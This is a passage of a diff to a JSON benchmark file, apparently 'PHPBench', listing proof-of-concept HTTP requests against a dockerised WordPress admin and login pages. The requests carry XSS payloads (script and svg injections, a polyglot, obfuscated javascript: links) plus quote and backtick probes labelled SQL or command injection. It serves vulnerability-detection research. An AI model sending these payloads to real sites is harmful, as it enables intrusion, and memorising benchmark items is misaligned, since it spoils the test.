+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_6af819",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(5397)//>\\x3e"
+      ],
+      "pwd": [
+        "#jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(5397)//>\\x3e"
+      ],
+      "redirect_to": [
+        "http://10.176.36.21:50025/wp-admin/"
+      ],
+      "rememberme": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6819ca0aae144",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_6dae93",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "role": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.681c5790f0e72",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_7fe9ac",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/update-core.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/update-core.php"
+      ],
+      "_wpnonce": [
+        "6c1da51e0e"
+      ],
+      "locale": [
+        "en_US"
+      ],
+      "upgrade": [
+        "Update to version 6.7.2"
+      ],
+      "version": [
+        "6.7.2"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "\""
+      ]
+    },
+    "request_id": "requests.67df0541c79c3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_80b8c5",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        ""
+      ],
+      "delete_comments[0]": [
+        "1"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:21:56"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941633b477a6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_820bfb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "pwd": [
+        "xuefeng20011024"
+      ],
+      "redirect_to": [
+        "http://10.176.36.21:50015/wp-admin/"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631f1b28f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_857bfa",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
+      "_wp_http_referer": [
+        "/wp-admin/users.php"
+      ],
+      "_wpnonce": [
+        "1d52254f20"
+      ],
+      "action": [
+        "-1"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "changeit": [
+        "Change"
+      ],
+      "new_role": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "new_role2": [
+        ""
+      ],
+      "paged": [
+        "</title></option><script>xss(52925217)</script>"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ],
+      "users[]": [
+        "1"
+      ]
+    },
+    "request_id": "requests.6941637666866",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_85cf89",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/update.php",
+    "post_data": {
+      "_fs_nonce": [
+        "a92e042abc"
+      ],
+      "connection_type": [
+        "ftp"
+      ],
+      "hostname": [
+        "xuefeng20011024"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "upgrade": [
+        "Proceed"
+      ],
+      "username": [
+        "xuefeng20011024"
+      ]
+    },
+    "query_params": {
+      "_wpnonce": [
+        "cd21139683"
+      ],
+      "action": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "plugin": [
+        "classic-editor"
+      ]
+    },
+    "request_id": "requests.67df053abbd7d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_88cf0e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {
+      "var wpLinkL10n ": [
+        "{\"title\":\"Insert\\/edit link\",\"update\":\"Update\",\"save\":\"Add Link\",\"noTitle\":\"(no title)\",\"noMatchesFound\":\"No results found.\",\"linkSelected\":\"Link selected.\",\"linkInserted\":\"Link inserted.\",\"minInputLength\":\"3\"};"
+      ]
+    },
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "7169d43319"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "20"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        "comment"
+      ],
+      "delete_comments[0]": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-04-24 16:03:18"
+      ],
+      "s": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.681c58b67473a",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_8f66d9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/comment.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/comment.php?action=editcomment&c=1"
+      ],
+      "_wp_original_http_referer": [
+        ""
+      ],
+      "_wpnonce": [
+        "9850a830cd"
+      ],
+      "aa": [
+        "123"
+      ],
+      "action": [
+        "editedcomment"
+      ],
+      "c": [
+        "1"
+      ],
+      "closedpostboxesnonce": [
+        "5c2858d17b"
+      ],
+      "comment_ID": [
+        "1"
+      ],
+      "comment_post_ID": [
+        "1"
+      ],
+      "comment_status": [
+        "1"
+      ],
+      "content": [
+        "xuefeng20011024"
+      ],
+      "cur_aa": [
+        "2025"
+      ],
+      "cur_hh": [
+        "23"
+      ],
+      "cur_jj": [
+        "09"
+      ],
+      "cur_mm": [
+        "12"
+      ],
+      "cur_mn": [
+        "14"
+      ],
+      "hh": [
+        "123"
+      ],
+      "hidden_aa": [
+        "2025"
+      ],
+      "hidden_hh": [
+        "09"
+      ],
+      "hidden_jj": [
+        "11"
+      ],
+      "hidden_mm": [
+        "02"
+      ],
+      "hidden_mn": [
+        "45"
+      ],
+      "jj": [
+        "123"
+      ],
+      "mm": [
+        "01"
+      ],
+      "mn": [
+        "123"
+      ],
+      "newcomment_author": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "newcomment_author_email": [
+        "xuefeng20011024"
+      ],
+      "newcomment_author_url": [
+        "xuefeng20011024"
+      ],
+      "noredir": [
+        "1"
+      ],
+      "p": [
+        "1"
+      ],
+      "referredby": [
+        ""
+      ],
+      "save": [
+        "Update"
+      ],
+      "ss": [
+        "35"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.69416384ba62a",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_913b7e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/erase-personal-data.php",
+    "post_data": {},
+    "query_params": {
+      "filter-status": [
+        ""
+      ],
+      "order": [
+        ""
+      ],
+      "orderby": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.694163721a797",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_9772cb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options.php",
+    "post_data": {
+      "WPLANG": [
+        "</title></option><script>xss(94214553)</script>"
+      ],
+      "_wp_http_referer": [
+        "/wp-admin/options-general.php?highlight=confirm_admin_email"
+      ],
+      "_wpnonce": [
+        "fde880e94c"
+      ],
+      "action": [
+        "update"
+      ],
+      "blogdescription": [
+        "</title></option><script>xss(26348834)</script>"
+      ],
+      "blogname": [
+        "</title></option><script>xss(61144120)</script>"
+      ],
+      "date_format": [
+        "</title></option><script>xss(92299227)</script>"
+      ],
+      "date_format_custom": [
+        "</title></option><script>xss(8202411)</script>"
+      ],
+      "default_role": [
+        "</title></option><script>xss(15062401)</script>"
+      ],
+      "home": [
+        "xuefeng20011024"
+      ],
+      "new_admin_email": [
+        "</title></option><script>xss(19409198)</script>"
+      ],
+      "option_page": [
+        "general"
+      ],
+      "site_icon": [
+        "0"
+      ],
+      "siteurl": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "start_of_week": [
+        "</title></option><script>xss(6712605)</script>"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "time_format": [
+        "</title></option><script>xss(88766034)</script>"
+      ],
+      "time_format_custom": [
+        "</title></option><script>xss(61169035)</script>"
+      ],
+      "timezone_string": [
+        "</title></option><script>xss(23864185)</script>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.69416359e7267",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_97d9f0",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "xuefeng20011024"
+      ],
+      "pwd": [
+        "xuefeng20011024"
+      ],
+      "redirect_to": [
+        "`"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631eef633",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_9adcb6",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "id": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "update": [
+        "add"
+      ]
+    },
+    "request_id": "requests.681c57b4be1f0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_9ba83f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/options-discussion.php"
+      ],
+      "_wpnonce": [
+        "1f89f926a2"
+      ],
+      "action": [
+        "update"
+      ],
+      "close_comments_days_old": [
+        "123"
+      ],
+      "close_comments_for_old_posts": [
+        "1"
+      ],
+      "comment_max_links": [
+        "123"
+      ],
+      "comment_moderation": [
+        "1"
+      ],
+      "comment_order": [
+        "asc"
+      ],
+      "comment_previously_approved": [
+        "1"
+      ],
+      "comment_registration": [
+        "1"
+      ],
+      "comments_notify": [
+        "1"
+      ],
+      "comments_per_page": [
+        "123"
+      ],
+      "default_comment_status": [
+        "open"
+      ],
+      "default_comments_page": [
+        "newest"
+      ],
+      "default_ping_status": [
+        "open"
+      ],
+      "default_pingback_flag": [
+        "1"
+      ],
+      "disallowed_keys": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "moderation_keys": [
+        "xuefeng20011024"
+      ],
+      "moderation_notify": [
+        "1"
+      ],
+      "option_page": [
+        "discussion"
+      ],
+      "page_comments": [
+        "1"
+      ],
+      "require_name_email": [
+        "1"
+      ],
+      "show_avatars": [
+        "1"
+      ],
+      "show_comments_cookies_opt_in": [
+        "1"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "thread_comments": [
+        "1"
+      ],
+      "thread_comments_depth": [
+        "2"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163a6101c4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_a10ed7",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "`"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_a55a2d",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/export.php",
+    "post_data": {
+      "WHERE ( comment_approved ": [
+        "'post-trashed' )"
+      ]
+    },
+    "query_params": {
+      "attachment_end_date": [
+        "'"
+      ],
+      "attachment_start_date": [
+        "0"
+      ],
+      "cat": [
+        "0"
+      ],
+      "content": [
+        "attachment"
+      ],
+      "download": [
+        "true"
+      ],
+      "page_author": [
+        "1"
+      ],
+      "page_end_date": [
+        "2025-02"
+      ],
+      "page_start_date": [
+        "2025-02"
+      ],
+      "page_status": [
+        "private"
+      ],
+      "post_author": [
+        "1"
+      ],
+      "post_end_date": [
+        "2025-02"
+      ],
+      "post_start_date": [
+        "2025-02"
+      ],
+      "post_status": [
+        "private"
+      ],
+      "submit": [
+        "Download Export File"
+      ]
+    },
+    "request_id": "requests.681c587c82941",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_a5d73d",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"35a04922b1\"};"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "asc"
+      ],
+      "orderby": [
+        "select"
+      ]
+    },
+    "request_id": "requests.681c57491ca76",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_a5e706",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "desc"
+      ],
+      "orderby": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "post_type": [
+        "page"
+      ]
+    },
+    "request_id": "requests.681c57f2b847c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_a9d4a5",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/profile.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/profile.php?wp_http_referer=%2Fwp-admin%2Fusers.php"
+      ],
+      "_wpnonce": [
+        "c5505b8779"
+      ],
+      "action": [
+        "update"
+      ],
+      "admin_bar_front": [
+        "</title></option><script>xss(62092469)</script>"
+      ],
+      "admin_color": [
+        "</title></option><script>xss(83263311)</script>"
+      ],
+      "checkuser_id": [
+        "1"
+      ],
+      "color-nonce": [
+        "a21bb6effd"
+      ],
+      "comment_shortcuts": [
+        "</title></option><script>xss(21966227)</script>"
+      ],
+      "description": [
+        "\""
+      ],
+      "display_name": [
+        "</title></option><script>xss(59791305)</script>"
+      ],
+      "email": [
+        "</title></option><script>xss(40629044)</script>"
+      ],
+      "first_name": [
+        "cesyeoey"
+      ],
+      "from": [
+        "profile"
+      ],
+      "last_name": [
+        "cesyeoey"
+      ],
+      "nickname": [
+        "cesyeoey"
+      ],
+      "pass1": [
+        "</title></option><script>xss(21356479)</script>"
+      ],
+      "pass2": [
+        "</title></option><script>xss(59949618)</script>"
+      ],
+      "rich_editing": [
+        "</title></option><script>xss(39436639)</script>"
+      ],
+      "submit": [
+        "Update Profile"
+      ],
+      "syntax_highlighting": [
+        "</title></option><script>xss(46695540)</script>"
+      ],
+      "url": [
+        "xuefeng20011024"
+      ],
+      "user_id": [
+        "1"
+      ],
+      "user_login": [
+        "cesyeoey"
+      ],
+      "wp_http_referer": [
+        "<br />\r\n<b>Warning</b>:  main() [echo]: Attempt to echo a string that might be tainted in <b>/var/www/html/wp-admin/user-edit.php</b> on line <b>284</b><br />\r\n/wp-admin/users.php"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163809eda6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_aa0990",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/plugin-install.php",
+    "post_data": {
+      "var _wpUpdatesSettings ": [
+        "{\"ajax_nonce\":\"41b47316dd\"};"
+      ]
+    },
+    "query_params": {
+      "TB_iframe": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "from": [
+        "import"
+      ],
+      "height": [
+        "550"
+      ],
+      "plugin": [
+        "movabletype-importer"
+      ],
+      "tab": [
+        "plugin-information"
+      ],
+      "width": [
+        "600"
+      ]
+    },
+    "request_id": "requests.681c57b2b33fd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ada44c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/upgrade.php",
+    "post_data": {},
+    "query_params": {
+      "step": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.6941638f47210",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_b0bab4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/index.php",
+    "post_data": {},
+    "query_params": {
+      "context": [
+        "edit"
+      ],
+      "rest_route": [
+        "`"
+      ]
+    },
+    "request_id": "requests.67df0505b7145",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_b30560",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/users.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"35a04922b1\"};"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "orderby": [
+        "email"
+      ]
+    },
+    "request_id": "requests.681c57493ae1d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_b42935",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_b82852",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_bc0151",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/index.php/comments/feed",
+    "post_data": {},
+    "query_params": {
+      "name": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ]
+    },
+    "request_id": "requests.6819ca0b8a2cd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_bff432",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
